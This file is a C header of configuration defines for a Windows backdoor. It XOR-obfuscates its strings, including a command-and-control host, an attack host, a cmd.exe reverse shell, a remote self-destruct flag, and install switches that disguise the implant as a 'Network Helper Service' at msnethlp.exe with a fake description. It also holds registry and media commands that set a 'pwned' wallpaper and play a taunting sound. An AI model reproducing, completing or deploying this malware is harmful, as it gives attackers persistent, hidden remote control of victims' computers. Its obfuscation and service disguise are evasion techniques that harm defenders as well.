#define BD_BUF_SIZE		32768

#define BD_PORT 		443

// www.example.com
#define BD_ATTACK_HOST xorit(0xC0, "\xb7\xb7\xb7\xee\xa5\xb8\xa1\xad\xb0\xac\xa5\xee\xa3\xaf\xad",15)

// updates.example.com
#define BD_CNC_HOST xorit(0x05, "\x70\x75\x61\x64\x71\x60\x76\x2b\x60\x7d\x64\x68\x75\x69\x60\x2b\x66\x6a\x68",19)

#define BD_CNC_SLEEP_TIME	20000	// amount of time to sleep after cnc check
#define BD_DNS_SLEEP_TIME	15000	// amount of time to sleep after dns lookup failure (attack host)
#define BD_RSHELL_SLEEP_TIME	10000	// amount of time to sleep between reverse shell connections

#define BD_CNC_RSHELL_FLAG	0x04	// mask for reverse shell run flag
#define BD_CNC_SELF_DESTRUCT	0x08	// mask for remote self destruct

// use ONE of these methods
#define BD_INSTALL_METHOD_SHELL		// will use system() shell commands to install service
//#define BD_INSTALL_METHOD_INT		// will use internal c functions to install service


// cmd.exe
#define BD_SHELL_CMD xorit(0xF0, "\x93\x9d\x94\xde\x95\x88\x95",7)

// -install
#define BD_INSTALL_SWITCH xorit(0x99, "\xb4\xf0\xf7\xea\xed\xf8\xf5\xf5",8)

// -remove
#define BD_REMOVE_SWITCH xorit(0x99, "\xb4\xeb\xfc\xf4\xf6\xef\xfc",7)

// -nosvc
#define BD_NOSVC_SWITCH xorit(0x99, "\xb4\xf7\xf6\xea\xef\xfa",6)

// Installation failure\n
#define BD_ERR_INSTALL_FAILURE xorit(0x34, "\x7d\x5a\x47\x40\x55\x58\x58\x55\x40\x5d\x5b\x5a\x14\x52\x55\x5d\x58\x41\x46\x51\x68\x5a",22)

// c:\windows\system32\msnethlp.exe
#define BD_SERVICE_EXE xorit(0xB3, "\xd0\x89\xef\xc4\xda\xdd\xd7\xdc\xc4\xc0\xef\xc0\xca\xc0\xc7\xd6\xde\x80\x81\xef\xde\xc0\xdd\xd6\xc7\xdb\xdf\xc3\x9d\xd6\xcb\xd6",32)

// c:\windows\web\wallpaper\pwned.jpg
#define BD_WALLPAPER_FN xorit(0x3F, "\x5c\x05\x63\x48\x56\x51\x5b\x50\x48\x4c\x63\x48\x5a\x5d\x63\x48\x5e\x53\x53\x4f\x5e\x4f\x5a\x4d\x63\x4f\x48\x51\x5a\x5b\x11\x55\x4f\x58",34)

// this sets the desktop wallpaper to stretch to fit the screen
// reg add "HKCU\Control Panel\Desktop" /v WallpaperStyle /d 2 /f
#define BD_REG_DESKTOP_STRETCH_CMD xorit(0xD5, "\xa7\xb0\xb2\xf5\xb4\xb1\xb1\xf5\xf7\x9d\x9e\x96\x80\x89\x96\xba\xbb\xa1\xa7\xba\xb9\xf5\x85\xb4\xbb\xb0\xb9\x89\x91\xb0\xa6\xbe\xa1\xba\xa5\xf7\xf5\xfa\xa3\xf5\x82\xb4\xb9\xb9\xa5\xb4\xa5\xb0\xa7\x86\xa1\xac\xb9\xb0\xf5\xfa\xb1\xf5\xe7\xf5\xfa\xb3",62)

// this sets the wallpaper to the pwned.jpg
// reg add "HKCU\Control Panel\Desktop" /v Wallpaper /d "c:\windows\web\wallpaper\pwned.jpg" /f
#define BD_REG_DESKTOP_WALLPAPER_CMD xorit(0x0C, "\x7e\x69\x6b\x2c\x6d\x68\x68\x2c\x2e\x44\x47\x4f\x59\x50\x4f\x63\x62\x78\x7e\x63\x60\x2c\x5c\x6d\x62\x69\x60\x50\x48\x69\x7f\x67\x78\x63\x7c\x2e\x2c\x23\x7a\x2c\x5b\x6d\x60\x60\x7c\x6d\x7c\x69\x7e\x2c\x23\x68\x2c\x2e\x6f\x36\x50\x7b\x65\x62\x68\x63\x7b\x7f\x50\x7b\x69\x6e\x50\x7b\x6d\x60\x60\x7c\x6d\x7c\x69\x7e\x50\x7c\x7b\x62\x69\x68\x22\x66\x7c\x6b\x2e\x2c\x23\x6a",92)

// c:\windows\temp\pwned.mp3
#define BD_SOUND_PWNED xorit(0x43, "\x20\x79\x1f\x34\x2a\x2d\x27\x2c\x34\x30\x1f\x37\x26\x2e\x33\x1f\x33\x34\x2d\x26\x27\x6d\x2e\x33\x70",25)

// for mciSendString() - used to open pwnage sound
// open "c:\windows\temp\pwned.mp3" type mpegvideo alias mp3
#define BD_MCI_SEND_STR_OPEN xorit(0x2C, "\x43\x5c\x49\x42\x0c\x0e\x4f\x16\x70\x5b\x45\x42\x48\x43\x5b\x5f\x70\x58\x49\x41\x5c\x70\x5c\x5b\x42\x49\x48\x02\x41\x5c\x1f\x0e\x0c\x58\x55\x5c\x49\x0c\x41\x5c\x49\x4b\x5a\x45\x48\x49\x43\x0c\x4d\x40\x45\x4d\x5f\x0c\x41\x5c\x1f",57)

// for mciSendString() - used to play pwnage sound
// play mp3 from 0 wait
#define BD_MCI_SEND_STR_PLAY xorit(0x15, "\x65\x79\x74\x6c\x35\x78\x65\x26\x35\x73\x67\x7a\x78\x35\x25\x35\x62\x74\x7c\x61",20)

// Network Helper Service
#define BD_SERVICE_NAME xorit(0xB3, "\xfd\xd6\xc7\xc4\xdc\xc1\xd8\x93\xfb\xd6\xdf\xc3\xd6\xc1\x93\xe0\xd6\xc1\xc5\xda\xd0\xd6",22)

// This service provides connection services for Local Area Networks
#define BD_SERVICE_DESCRIPTION xorit(0xF0, "\xa4\x98\x99\x83\xd0\x83\x95\x82\x86\x99\x93\x95\xd0\x80\x82\x9f\x86\x99\x94\x95\x83\xd0\x93\x9f\x9e\x9e\x95\x93\x84\x99\x9f\x9e\xd0\x83\x95\x82\x86\x99\x93\x95\x83\xd0\x96\x9f\x82\xd0\xbc\x9f\x93\x91\x9c\xd0\xb1\x82\x95\x91\xd0\xbe\x95\x84\x87\x9f\x82\x9b\x83",65)
